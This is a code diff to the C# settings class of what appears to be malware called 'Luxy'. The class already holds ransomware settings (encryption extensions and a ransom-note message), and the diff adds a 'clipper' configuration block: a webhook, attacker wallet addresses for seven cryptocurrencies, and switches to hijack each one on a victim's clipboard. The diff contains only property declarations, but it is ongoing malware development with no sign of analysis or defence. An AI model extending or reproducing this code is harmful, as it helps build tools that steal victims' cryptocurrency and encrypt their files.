@@ -36,6 +36,25 @@ namespace Luxy
         internal static string EncryptExtension { get; set; }
         internal static string EncryptExtensionList { get; set; }
         internal static string ReadMeMessage { get; set; }
+        internal static bool ShowReadMeMessage { get; set; }
+
+        // Clipper Setttings
+        internal static string WebhookClipper { get; set; }
+        internal static string BtcAddr { get; set; }
+        internal static string EthAddr { get; set; }
+        internal static string DogeAddr { get; set; }
+        internal static string LtcAddr { get; set; }
+        internal static string DashAddr { get; set; }
+        internal static string XmrAddr { get; set; }
+        internal static string BchAddr { get; set; }
+
+        internal static bool BtcClip { get; set; }
+        internal static bool EthClip { get; set; }
+        internal static bool DogeClip { get; set; }
+        internal static bool LtcClip { get; set; }
+        internal static bool DashClip { get; set; }
+        internal static bool XmrClip { get; set; }
+        internal static bool BchClip { get; set; }
 
         // Icon
         internal static string IconPath { get; set; }
